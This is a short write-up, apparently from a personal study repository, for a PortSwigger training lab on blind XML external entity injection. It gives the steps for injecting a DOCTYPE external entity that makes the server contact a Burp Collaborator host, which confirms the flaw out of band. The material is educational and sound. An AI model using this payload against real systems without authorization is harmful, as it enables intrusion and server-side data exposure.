# Blind XXE - with out-of-band interaction 

## 📌 Lab Details
- **Title**: Blind XXE with out-of-band interaction
- **Difficulty**: Practitioner
- **Category**: XML external entity injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/1ad475bf32f0d913c25ead9582f05687c1ad039228d0a3c8d56c768fd2250a2b?referrer=%2fweb-security%2fxxe%2fblind%2flab-xxe-with-out-of-band-interaction

## 🔍 Summary
This lab demonstrates a **Blind XXE** vulnerability where the server parses XML but doesn't show output. You confirm the exploit by triggering an **out-of-band (OAST)** request to **Burp Collaborator**.

## 🛠 Steps to Solve
1. Intercept the resulting **POST** request of "Check stock" in **Burp Suite**.
2. Inject the following **extenal entity** in between XML declaration:
   ```sh
   <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
   ```
3. Replace the `productId` with a reference to the external entity `&xxe`.

## 📖 Key Takeaways
- **Blind XXE**: The application doesn’t return any file contents or error messages, so traditional XXE payloads give no visual confirmation.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e1319528-ddfe-4125-8dd0-751488e13d30" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8e0e476e-2629-47fa-a4af-073bf7b6b3c8" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/11444935-d1b9-4938-8773-ad0fe2fd9710" />
